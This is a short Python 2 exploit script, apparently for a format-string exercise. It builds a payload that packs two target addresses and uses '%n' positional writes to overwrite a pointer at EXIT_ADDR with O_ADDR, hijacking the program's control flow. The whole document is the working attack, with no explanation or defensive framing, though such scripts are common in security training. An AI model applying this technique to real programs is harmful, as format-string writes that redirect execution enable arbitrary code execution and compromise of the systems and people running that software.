import struct
import os
O_ADDR = 0x80484a4

EXIT_ADDR = 0x8049838

def pad(s):
    return s+"X"*(512-len(s))

exploit = ""
exploit += struct.pack("I", EXIT_ADDR)
exploit += struct.pack("I", EXIT_ADDR+2)

exploit += "%4$33948x"
exploit += "%4$n"
exploit += "%33632x"
exploit += "%5$n"
print pad(exploit)
